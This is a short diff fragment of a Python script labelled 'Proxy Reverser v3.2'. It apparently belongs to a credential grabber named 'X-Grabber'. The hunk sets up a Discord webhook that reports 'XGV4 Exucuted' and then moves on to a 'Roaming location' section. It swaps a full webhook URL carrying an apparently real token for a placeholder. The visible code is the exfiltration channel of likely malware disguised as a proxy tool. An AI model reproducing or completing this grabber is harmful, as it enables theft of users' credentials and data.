@@ -17,7 +17,7 @@ print('[Log] | Starting Proxy Reverser v3.2')
 msg = '''diff
 - XGV4 Exucuted.
 '''
-url = 'https://ptb.discordapp.com/api/webhooks/730462621077209088/RvyE1TJvRcepUwOaZKwKVl1xk9bj9CArgIDMUBP54XZVNDndc9qYF8jrwSuM2Fdw23ra'
+url = 'WEBHOOK HERE'
 webhook = DiscordWebhook(url=url, username="X-Grabber", content=msg)
 
 ## Roaming location
